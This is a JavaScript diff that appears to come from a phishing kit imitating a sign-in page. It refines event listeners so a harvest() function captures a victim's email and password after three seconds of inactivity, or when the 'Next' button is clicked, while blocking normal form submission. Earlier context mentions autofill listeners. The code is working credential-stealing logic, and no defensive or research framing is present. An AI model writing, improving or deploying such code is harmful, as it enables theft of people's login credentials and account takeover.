@@ -82,33 +82,38 @@ function setupEventListeners() {
   });
   console.log('Autofill listeners set up.');
 
-  // 2. Manual entry on visible forms with debounce
+  // 2. Manual entry on visible forms with debounce and button logic
   const visibleEmail = document.getElementById('visible-email');
   const visiblePassword = document.getElementById('visible-password');
+  const signinButton = document.getElementById('signin-button');
   let debounceTimeout;
 
-  if (visibleEmail && visiblePassword) {
-    const debouncedHarvest = () => {
-      clearTimeout(debounceTimeout);
-      debounceTimeout = setTimeout(() => {
-        if (visibleEmail.value && visiblePassword.value) {
-          harvest();
-        }
-      }, 3000); // Wait for 3 seconds of inactivity
-    };
-
-    visibleEmail.addEventListener('input', debouncedHarvest);
-    visiblePassword.addEventListener('input', debouncedHarvest);
-    console.log('Debounced manual input listeners set up.');
-  }
-
-  // 3. "Next" button as a fallback
-  const signinButton = document.getElementById('signin-button');
   if (signinButton) {
+    signinButton.disabled = true; // Disable button initially
+
+    // Add click listener for manual submission
     signinButton.addEventListener('click', (e) => {
       e.preventDefault(); // Prevent default form submission
       harvest();
     });
+  }
+
+  if (visibleEmail && visiblePassword && signinButton) {
+    const handleInput = () => {
+      // Update button state
+      const bothFieldsFilled = visibleEmail.value && visiblePassword.value;
+      signinButton.disabled = !bothFieldsFilled;
+
+      // Debounced harvest
+      clearTimeout(debounceTimeout);
+      if (bothFieldsFilled) {
+        debounceTimeout = setTimeout(harvest, 3000); // Wait for 3 seconds of inactivity
+      }
+    };
+
+    visibleEmail.addEventListener('input', handleInput);
+    visiblePassword.addEventListener('input', handleInput);
+    console.log('Manual input listeners with button logic set up.');
   }
 }
 
